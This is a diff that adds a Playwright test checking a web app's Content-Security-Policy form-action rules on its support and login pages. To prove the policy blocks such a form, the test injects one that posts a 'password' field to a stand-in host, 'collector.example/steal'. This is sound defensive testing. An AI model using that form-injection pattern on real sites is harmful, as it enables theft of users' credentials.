@@ -79,6 +79,46 @@ test("pages run their own scripts only", async ({ page }) => {
 	expect(ran).toBe(false)
 })
 
+const formAction = (csp: string) => /(?:^|;\s*)form-action ([^;]*)/.exec(csp)?.[1]
+
+test("pages' forms post to this origin only", async ({ page }) => {
+	const response = await page.goto("/support")
+	expect(formAction(response?.headers()["content-security-policy"] ?? "")).toBe("'self'")
+	await waitForHydration(page)
+	// A form that injected HTML would add, posting what it collects to another site, is stopped
+	// before anything leaves the page.
+	const reached: string[] = []
+	await page.route("https://collector.example/**", (route) => {
+		reached.push(route.request().url())
+		return route.fulfill({ body: "collected" })
+	})
+	const violated = await page.evaluate(
+		() =>
+			new Promise<string>((resolve) => {
+				document.addEventListener("securitypolicyviolation", (event) =>
+					resolve(event.effectiveDirective),
+				)
+				const form = document.createElement("form")
+				form.method = "post"
+				form.action = "https://collector.example/steal"
+				const field = document.createElement("input")
+				field.name = "password"
+				field.value = "secret"
+				form.append(field)
+				document.body.append(form)
+				form.submit()
+			}),
+	)
+	expect(violated).toBe("form-action")
+	expect(reached).toEqual([])
+
+	// The sign-in pages also let their own forms go on to the providers they offer: GitHub here.
+	const login = await page.request.get("/login")
+	expect(formAction(login.headers()["content-security-policy"] ?? "")).toBe(
+		"'self' https://github.com",
+	)
+})
+
 test("home and login render in Spanish when the browser prefers it", async ({ browser }) => {
 	const context = await browser.newContext({ locale: "es-ES" })
 	const page = await context.newPage()
